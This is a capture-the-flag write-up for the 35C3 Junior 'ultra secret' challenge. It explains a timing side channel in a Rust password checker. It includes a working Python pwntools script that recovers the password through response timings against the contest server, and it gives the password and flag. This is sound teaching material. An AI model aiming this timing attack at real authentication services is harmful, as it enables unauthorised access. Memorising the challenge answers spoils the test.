# 35C3 Junior CTF – ultra secret

* **Category:** Misc
* **Points:** 102 (variable)

## Challenge

> This flag is protected by a password stored in a highly sohpisticated chain of hashes. Can you capture it nevertheless? We are certain the password consists of lowercase alphanumerical characters only.
>
> nc 35.207.158.95 1337
>
> Difficulty estimate: Easy

## Solution

You will have the server source code written in *Rust*.

```Rust
extern crate crypto;

use std::io;
use std::io::BufRead;
use std::process::exit;
use std::io::BufReader;
use std::io::Read;
use std::fs::File;
use std::path::Path;
use std::env;

use crypto::digest::Digest;
use crypto::sha2::Sha256;

fn main() {
    let mut password = String::new();
    let mut flag = String::new();
    let mut i = 0;
    let stdin = io::stdin();
    let hashes: Vec<String> = BufReader::new(File::open(Path::new("hashes.txt")).unwrap()).lines().map(|x| x.unwrap()).collect();
    BufReader::new(File::open(Path::new("flag.txt")).unwrap()).read_to_string(&mut flag).unwrap();

    println!("Please enter the very secret password:");
    stdin.lock().read_line(&mut password).unwrap();
    let password = &password[0..32];
    for c in password.chars() {
        let hash =  hash(c);
        if hash != hashes[i] {
            exit(1);
        }
        i += 1;
    }
    println!("{}", &flag)
}

fn hash(c: char) -> String {
    let mut hash = String::new();
    hash.push(c);
    for _ in 0..9999 {
        let mut sha = Sha256::new();
        sha.input_str(&hash);
        hash = sha.result_str();
    }
    hash
}
```

The server asks for a password and calculates 9999 chained hashes, with SHA-256, for each passed char. The result for each char is compared with a stored one into a text file. If all chars are correct, then the flag is printed from a text file. If a char is wrong the script terminates itself.

There is nothing wrong into the script and the only way to print the flag is to discover the password.

The time to compute several hashes can be high. If a submitted char is correct, the time to receive the answer will be greater of the time to receive the answer for a wrong char, because the hash calculation for the next char will be executed. Hence a timing attack can be used to guess all the chars.

A Python script can be developed to automatize the operation.

```Python
from pwn import *

# 10e004c2e186b4d280fad7f36e779ed4

chars = list("1234567890qwertyuiopasdfghjklzxcvbnm")
password = list(" "*32)
possible_flag = None

for p in range(len(password)):
   print "[*] Char {}.".format(p)

   if password[p] != " ":
      print "[*] Already set, going on..."
      continue

   best_char = " "
   best_response_time = 0.0

   for c in range(len(chars)):
      password[p] = chars[c]
      password_string = "".join(password)
      print "[*] Testing password '{}'.".format(password_string)
      r = remote("35.207.158.95", 1337)
      print r.recvline()
      r.sendline(password_string)
      start = time.time()
      received_response = r.recvall()
      end = time.time()
      print received_response
      r.close()

      if received_response is not None and "35c3" in received_response.lower():
         possible_flag = received_response

      response_time = end - start
      print "[*] Response time is '{}'.".format(response_time)
      if response_time > best_response_time:
         best_response_time = response_time
         best_char = chars[c]

   password[p] = best_char

password_string = "".join(password)
print "    ===================================================="
print "[*] The password is '{}'.".format(password_string)
print "    ===================================================="

if possible_flag is not None:
   print "[*] A possible flag is '{}'.".format(possible_flag)
   print "    ===================================================="

print "[*] Testing password '{}'.".format(password_string)
r = remote("35.207.158.95", 1337)
print r.recvline()
r.sendline(password_string)
print r.recvall()
```

The password is: `10e004c2e186b4d280fad7f36e779ed4`.

The flag is the following.

```
35C3_timing_attacks_are_fun!_:)
```